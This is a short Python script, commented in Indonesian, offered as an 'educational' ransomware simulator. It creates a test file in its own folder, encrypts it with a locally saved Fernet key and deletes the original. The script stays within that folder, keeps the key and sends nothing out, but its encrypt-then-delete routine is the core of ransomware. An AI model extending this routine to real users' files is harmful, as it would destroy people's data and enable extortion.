#!/usr/bin/env python3
# ⚠️ PERINGATAN: HANYA UNTUK TUJUAN EDUKASI ⚠️
# Jangan gunakan untuk merusak sistem orang lain!

import os
import sys
from cryptography.fernet import Fernet

class EducationalRansomware:
    def __init__(self, test_folder="test_enkripsi"):
        self.folder = test_folder
        self.key_file = "key_belajar.key"
        
    def generate_key(self):
        key = Fernet.generate_key()
        with open(self.key_file, 'wb') as f:
            f.write(key)
        return key
    
    def encrypt_files(self):
        print(f"\n[*] Membuat folder test: {self.folder}")
        os.makedirs(self.folder, exist_ok=True)
        
        # Buat file test
        test_file = os.path.join(self.folder, "test.txt")
        with open(test_file, 'w') as f:
            f.write("Ini adalah file test untuk pembelajaran ransomware.")
        
        print(f"[*] File test dibuat: {test_file}")
        print("[*] Generate enkripsi key...")
        
        key = self.generate_key()
        cipher = Fernet(key)
        
        print("[*] Proses enkripsi...")
        with open(test_file, 'rb') as f:
            data = f.read()
        
        encrypted_data = cipher.encrypt(data)
        
        with open(test_file + '.encrypted', 'wb') as f:
            f.write(encrypted_data)
        
        os.remove(test_file)
        
        print(f"\n[✓] Ransomware simulation completed!")
        print(f"[✓] File terenkripsi: {test_file}.encrypted")
        print(f"[✓] Key recovery: {self.key_file}")
        print("\n[!] Untuk dekripsi, gunakan key yang sama.")

if __name__ == "__main__":
    print("="*50)
    print("💰 RANSOMWARE SIMULATOR - FAHZ-TOOLS 💰")
    print("⚠️  HANYA UNTUK PRAKTEK DI LINGKUNGAN SENDIRI!")
    print("="*50)
    
    rw = EducationalRansomware()
    rw.encrypt_files()
